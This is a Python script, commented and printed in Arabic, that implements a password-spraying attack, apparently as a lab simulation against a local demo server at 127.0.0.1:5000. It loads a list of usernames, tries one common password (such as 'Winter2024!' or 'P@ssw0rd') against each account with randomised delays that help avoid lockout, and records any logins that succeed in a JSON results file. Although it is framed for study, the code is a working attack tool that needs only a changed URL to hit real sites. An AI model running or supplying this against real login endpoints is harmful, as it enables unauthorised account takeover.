import requests
import time
import random
import json
from datetime import datetime
import os


class PasswordSprayingAttacker:
    """محرك محاكاة هجوم رش كلمات المرور"""

    def __init__(self, target_url="http://127.0.0.1:5000/login"):
        self.target_url = target_url
        self.attack_results = []
        self.start_time = None

        # قوائم الهجوم
        self.common_passwords = [
            "Winter2024!", "Summer2023!", "Spring2024!", "Autumn2023!",
            "Password123!", "Welcome2024!", "P@ssw0rd", "Admin@123",
            "Changeme2024!", "SecurePass!", "Qwerty123!", "Letmein2024!"
        ]

        # إعدادات الهجوم
        self.attack_config = {
            'min_delay': 1.5,
            'max_delay': 4.0,
            'timeout_seconds': 10,
            'max_retries': 2
        }

    def load_target_users(self):
        """تحميل قائمة المستخدمين المستهدفين"""
        try:
            with open('data/users_db.json', 'r', encoding='utf-8') as f:
                users_db = json.load(f)
            return list(users_db.keys())
        except FileNotFoundError:
            # قائمة افتراضية إذا لم تكن قاعدة البيانات موجودة
            return ["admin", "john.doe", "jane.smith", "mike.brown",
                    "sara.jones", "alex.wang", "lisa.chen", "tom.harris"]

    def display_attack_header(self, target_password, user_count):
        """عرض ترويسة الهجوم"""
        print("\n" + "=" * 70)
        print(" هجوم رش كلمات المرور - محاكاة تفصيلية")
        print("=" * 70)
        print(f" وقت البدء: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f" كلمة المرور المستهدفة: {target_password}")
        print(f" عدد المستخدمين المستهدفين: {user_count}")
        print(f" الخادم المستهدف: {self.target_url}")
        print("=" * 70)
        print(" ستبدأ المحاكاة خلال 3 ثواني...")
        time.sleep(3)

    def execute_single_attack(self, username, password, attempt_number, total_attempts):
        """تنفيذ هجوم فردي على مستخدم"""
        print(f"\n{'=' * 60}")
        print(f" المحاولة {attempt_number}/{total_attempts}")
        print(f"{'=' * 60}")

        # إضافة تأخير عشوائي (لمحاكاة واقعية)
        if attempt_number > 1:
            delay = random.uniform(self.attack_config['min_delay'],
                                   self.attack_config['max_delay'])
            print(f" تأخير {delay:.1f} ثانية لمحاكاة واقعية...")
            time.sleep(delay)

        print(f" المستخدم المستهدف: {username}")
        print(f" كلمة المرور المجربة: {password}")

        # إرسال طلب المصادقة
        payload = {"username": username, "password": password}
        start_time = time.time()

        try:
            print(" إرسال طلب المصادقة...")
            response = requests.post(
                self.target_url,
                json=payload,
                timeout=self.attack_config['timeout_seconds'],
                headers={'Content-Type': 'application/json'}
            )

            elapsed_time = time.time() - start_time

            # تحضير النتيجة
            result = {
                'attempt_number': attempt_number,
                'username': username,
                'password_tested': password,
                'status_code': response.status_code,
                'response_time': elapsed_time,
                'timestamp': datetime.now().isoformat(),
                'success': response.status_code == 200
            }

            # إضافة بيانات الاستجابة إذا كانت موجودة
            if response.content:
                try:
                    response_data = response.json()
                    result['response_message'] = response_data.get('message', '')
                    result['server_time'] = response_data.get('server_time', 0)
                except:
                    result['response_message'] = response.text

            # عرض النتيجة
            if response.status_code == 200:
                print(f" النتيجة: ناجحة!")
                print(f" الرسالة: {result.get('response_message', '')}")
                print(f" اكتشاف: {username} ← {password}")
            elif response.status_code == 423:
                print(f" النتيجة: الحساب مقفل مؤقتاً")
            elif response.status_code == 401:
                print(f" النتيجة: فاشلة (بيانات غير صحيحة)")
            else:
                print(f"  النتيجة: خطأ ({response.status_code})")

            print(f" الوقت المستغرق: {elapsed_time:.3f} ثانية")

            # إظهار وقت الاستجابة من الخادم إذا كان متوفراً
            if 'server_time' in result:
                print(f"  وقت استجابة الخادم: {result['server_time']:.3f} ثانية")

            return result

        except requests.exceptions.RequestException as e:
            elapsed_time = time.time() - start_time
            print(f"  خطأ في الاتصال: {str(e)}")
            print(f" الوقت المستغرق: {elapsed_time:.3f} ثانية")

            return {
                'attempt_number': attempt_number,
                'username': username,
                'password_tested': password,
                'error': str(e),
                'response_time': elapsed_time,
                'timestamp': datetime.now().isoformat(),
                'success': False
            }

    def execute_full_attack(self):
        """تنفيذ هجوم كامل"""
        # تحميل المستخدمين المستهدفين
        target_users = self.load_target_users()
        total_users = len(target_users)

        # اختيار كلمة مرور واحدة للهجوم
        target_password = random.choice(self.common_passwords)

        # عرض ترويسة الهجوم
        self.display_attack_header(target_password, total_users)

        self.start_time = time.time()
        self.attack_results = []

        print("\n بدء تنفيذ الهجوم...\n")

        # تنفيذ الهجوم على كل مستخدم
        for i, username in enumerate(target_users, 1):
            result = self.execute_single_attack(username, target_password, i, total_users)
            self.attack_results.append(result)

            # فاصل بين المحاولات
            if i < total_users:
                print("\n" + "-" * 40)

        return self.attack_results

    def generate_attack_summary(self):
        """توليد ملخص مفصل للهجوم"""
        if not self.attack_results:
            print(" لم يتم تنفيذ أي هجوم بعد")
            return

        total_time = time.time() - self.start_time
        successful = sum(1 for r in self.attack_results if r.get('success'))
        failed = len(self.attack_results) - successful

        print("\n" + "=" * 70)
        print(" ملخص الهجوم التفصيلي")
        print("=" * 70)

        # الإحصائيات الأساسية
        print(f" كلمة المرور المستخدمة: {self.attack_results[0]['password_tested']}")
        print(f"إجمالي المستخدمين المستهدفين: {len(self.attack_results)}")
        print(f" المحاولات الناجحة: {successful}")
        print(f" المحاولات الفاشلة: {failed}")
        print(f" المدة الإجمالية: {total_time:.1f} ثانية")
        print(f" معدل المحاولات: {len(self.attack_results) / total_time:.2f} محاولة/ثانية")

        # عرض المستخدمين الناجحين
        if successful > 0:
            print(f"\n المستخدمين الناجحين:")
            for result in self.attack_results:
                if result.get('success'):
                    print(f"   👤 {result['username']} ← {result['password_tested']}")

        # تحليل الأوقات
        response_times = [r.get('response_time', 0) for r in self.attack_results]
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            max_time = max(response_times)
            min_time = min(response_times)

            print(f"\n  تحليل الأوقات:")
            print(f"     متوسط الوقت: {avg_time:.3f} ثانية")
            print(f"     أسرع محاولة: {min_time:.3f} ثانية")
            print(f"     أبطأ محاولة: {max_time:.3f} ثانية")

        # حفظ النتائج
        self.save_attack_results()

        print("\n تم حفظ النتائج في: data/attack_results.json")
        print("=" * 70)

    def save_attack_results(self):
        """حفظ نتائج الهجوم"""
        summary = {
            'attack_timestamp': datetime.now().isoformat(),
            'total_duration': time.time() - self.start_time,
            'target_password': self.attack_results[0]['password_tested'] if self.attack_results else None,
            'total_attempts': len(self.attack_results),
            'successful_attempts': sum(1 for r in self.attack_results if r.get('success')),
            'detailed_results': self.attack_results
        }

        with open('data/attack_results.json', 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

    def run(self):
        """تشغيل المحاكاة الكاملة"""
        try:
            # التحقق من أن الخادم يعمل
            print(" التحقق من اتصال الخادم...")
            test_response = requests.get("http://127.0.0.1:5000", timeout=5)
            if test_response.status_code == 200:
                print(" الخادم نشط وجاهز للهجوم")
            else:
                print("  الخادم قد لا يكون نشطاً")
        except:
            print(" لا يمكن الاتصال بالخادم. تأكد من تشغيل server.py أولاً")
            return

        # تنفيذ الهجوم
        input("\n↵ اضغط Enter لبدء محاكاة الهجوم...")
        self.execute_full_attack()
        self.generate_attack_summary()


if __name__ == "__main__":
    # إنشاء مجلد data إذا لم يكن موجوداً
    if not os.path.exists('data'):
        os.makedirs('data')

    attacker = PasswordSprayingAttacker()
    attacker.run()